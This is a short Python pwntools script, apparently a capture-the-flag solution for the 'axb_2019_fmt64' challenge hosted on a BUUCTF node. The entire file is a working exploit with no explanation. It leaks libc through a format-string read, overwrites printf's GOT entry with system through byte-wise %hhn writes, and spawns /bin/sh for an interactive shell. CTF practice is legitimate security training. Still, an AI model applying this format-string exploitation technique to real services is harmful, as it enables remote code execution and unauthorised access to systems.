from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('axb_2019_fmt64')
io = remote('node4.buuoj.cn', 27775)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')
elf = ELF('axb_2019_fmt64')
puts_got = elf.got['puts']
printf_got = elf.got['printf']

payload = b'%9$saaaa' + p64(puts_got)
io.sendafter('Please tell me:', payload)
io.recvuntil('Repeater:')
libc_base = u64(io.recvn(6).ljust(8, b'\x00')) - libc.sym['puts']
log.success('libc_base: ' + hex(libc_base))

system = libc_base + libc.sym['system']
payload = b''
cur_size = 9

for i in range(6):
    target_size = (system & (0xff << (i * 8))) >> (i * 8)
    if target_size > cur_size:
        payload += b'%' + str.encode(str(target_size - cur_size)) + b'c'
    else:
        payload += b'%' + str.encode(str(0x100 + target_size - cur_size)) + b'c'
    payload += b'%' + str.encode(str(34 + i)) + b'$hhn'
    cur_size = target_size

payload = payload.ljust(0xd0, b'a')
for i in range(6):
    payload += p64(printf_got + i)
# gdb.attach(io)
# pause()
io.sendafter('Please tell me:', payload)

io.send(b';/bin/sh\x00')
io.interactive()
